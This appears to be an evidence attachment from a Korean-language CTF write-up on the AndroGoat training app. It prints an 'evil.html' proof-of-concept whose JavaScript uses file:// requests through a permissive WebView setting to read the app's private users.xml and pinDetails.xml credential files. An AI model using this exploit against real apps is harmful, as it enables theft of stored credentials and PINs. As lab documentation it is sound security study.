---
{"title":"evil.html.txt","date":"2026-11-12","category":"ctf","tags":["AndroGoat","첨부파일","증거"],"summary":"04_input_validations/evil.html.txt · 콘솔·로그 기록 — AndroGoat 라이트업 증거 원본.","section":["AndroGoat","첨부파일"]}
---

> 이 문서는 [AndroGoat 라이트업](/posts/2026-11-12-androgoat.html)의 실측 증거 원본이다. 원본 경로 `04_input_validations/evil.html.txt` · 콘솔·로그 기록.

<pre><code>&lt;!doctype html&gt;
&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;
&lt;title&gt;evil&lt;/title&gt;&lt;/head&gt;
&lt;body style=&quot;font-family:monospace;font-size:13px&quot;&gt;
&lt;h3&gt;evil.html (외부 저장소에 놓인 공격자 파일)&lt;/h3&gt;
&lt;p&gt;이 페이지의 JavaScript가 앱 내부 파일을 읽는다 (allowUniversalAccessFromFileURLs=true)&lt;/p&gt;
&lt;pre id=&quot;out&quot;&gt;&lt;/pre&gt;
&lt;script&gt;
var targets = [
  &quot;file:///data/data/owasp.sat.agoat/shared_prefs/users.xml&quot;,
  &quot;file:///data/data/owasp.sat.agoat/shared_prefs/pinDetails.xml&quot;
];
var out = document.getElementById(&quot;out&quot;);
targets.forEach(function (u) {
  try {
    var x = new XMLHttpRequest();
    x.open(&quot;GET&quot;, u, false);
    x.send();
    out.textContent += &quot;[READ] &quot; + u + &quot;\n&quot; + x.responseText + &quot;\n\n&quot;;
  } catch (e) {
    out.textContent += &quot;[FAIL] &quot; + u + &quot;  &quot; + e + &quot;\n\n&quot;;
  }
});
&lt;/script&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>

[← 본문으로 돌아가기](/posts/2026-11-12-androgoat.html)
